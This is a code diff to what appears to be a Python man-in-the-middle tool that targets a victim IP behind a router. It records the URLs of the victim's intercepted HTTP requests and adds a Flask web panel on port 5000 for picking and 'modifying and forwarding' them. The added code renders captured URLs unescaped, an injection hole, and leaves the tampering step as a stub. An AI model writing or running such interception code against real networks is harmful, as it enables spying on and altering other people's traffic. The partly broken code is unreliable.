@@ -52,6 +52,7 @@ class Device:
         self.routerip = routerip
         self.targetip = targetip
         self.iface = iface
+        self.http_urls = []  # Stores the HTTP URLs
 
     def mitm(self):
         while True:
@@ -80,7 +81,8 @@ class Device:
                             host = raw_data.split("Host: ")[1].split("\r\n")[0]
                             path = raw_data.split("GET ")[1].split(" HTTP")[0]
                             url = f"http://{host}{path}"
-                            print(f"{Fore.CYAN}Visited URL: {url}{Style.RESET_ALL}")
+                            print(f"{Fore.CYAN}Captured URL: {url}{Style.RESET_ALL}")
+                            self.http_urls.append(url)  # Add captured URL to the list
                         except Exception:
                             pass
 
@@ -131,20 +133,40 @@ class Device:
 
         @app.route('/')
         def index():
+            # Display the captured HTTP URLs
+            if not self.http_urls:
+                return render_template_string("""
+                    <h1>HTTP Request Modification</h1>
+                    <p>No HTTP requests captured yet.</p>
+                """)
+            
+            url_list = "".join([f"<li><a href='/modify/{i}'>Modify {url}</a></li>" for i, url in enumerate(self.http_urls)])
             return render_template_string("""
                 <h1>HTTP Request Modification</h1>
-                <form method="POST" action="/modify">
-                    <textarea name="content" rows="10" cols="50" placeholder="Modify HTTP Content Here..."></textarea><br>
+                <ul>
+                    {{ url_list | safe }}
+                </ul>
+            """, url_list=url_list)
+
+        @app.route('/modify/<int:url_id>', methods=['GET', 'POST'])
+        def modify_request(url_id):
+            if url_id >= len(self.http_urls):
+                return f"{Fore.RED}Invalid URL ID.{Style.RESET_ALL}"
+
+            url = self.http_urls[url_id]
+            if request.method == 'POST':
+                content = request.form['content']
+                # Here you can apply the modification logic
+                print(f'{Fore.GREEN}Modified Content for {url}:{Style.RESET_ALL}\n{content}')
+                return f'Content modified for {url}: {content}'
+
+            return render_template_string("""
+                <h1>Modify HTTP Request for URL: {{ url }}</h1>
+                <form method="POST">
+                    <textarea name="content" rows="10" cols="50" placeholder="Modify HTTP Content Here...">{{ content }}</textarea><br>
                     <input type="submit" value="Modify and Forward">
                 </form>
-            """)
-
-        @app.route('/modify', methods=['POST'])
-        def modify_request():
-            content = request.form['content']
-            # Forward the modified content here as per your logic
-            print(f'{Fore.GREEN}Modified Content:{Style.RESET_ALL}\n{content}')
-            return f'Content modified: {content}'
+            """, url=url)
 
         def run_flask():
             app.run(host='0.0.0.0', port=5000, threaded=True)
